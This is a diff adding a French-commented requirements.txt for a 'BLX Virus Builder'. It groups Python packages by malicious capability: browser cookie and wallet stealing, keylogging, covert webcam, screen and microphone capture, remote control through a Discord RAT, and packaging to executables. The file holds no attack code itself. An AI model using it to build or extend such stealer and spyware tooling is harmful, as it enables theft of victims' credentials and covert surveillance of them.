@@ -1,0 +1,66 @@
+# ============================================
+# BLX Virus Builder - Toutes les dependances
+# ============================================
+# Installer avec: pip install -r requirements.txt
+# Ou lancer: setup.bat
+# Compatible avec auto-py-to-exe
+# ============================================
+
+# --- Virus Builder (GUI) ---
+colorama
+cryptography
+customtkinter
+requests
+discord.py
+pyinstaller
+
+# --- Auto-py-to-exe (optionnel) ---
+auto-py-to-exe
+
+# --- Windows / systeme ---
+pywin32
+
+# --- Stealer / navigateurs / wallets ---
+browser-cookie3
+pycryptodome
+
+# --- System info / hardware ---
+psutil
+GPUtil
+screeninfo
+
+# --- Webcam / screenshot / capture ---
+opencv-python
+Pillow
+mss
+
+# --- Clavier / souris / controle ---
+keyboard
+pyautogui
+pynput
+
+# --- Audio (micro) ---
+sounddevice
+scipy
+
+# --- RAT / Discord / divers ---
+comtypes
+pycaw
+numpy
+
+# --- Optionnels (autres outils / stealer avance) ---
+bcrypt
+beautifulsoup4
+deep-translator
+dnspython
+exifread
+instaloader
+phonenumbers
+piexif
+pyqt5
+pyqtwebengine
+pyzipper
+rarfile
+selenium
+urllib3
+whois
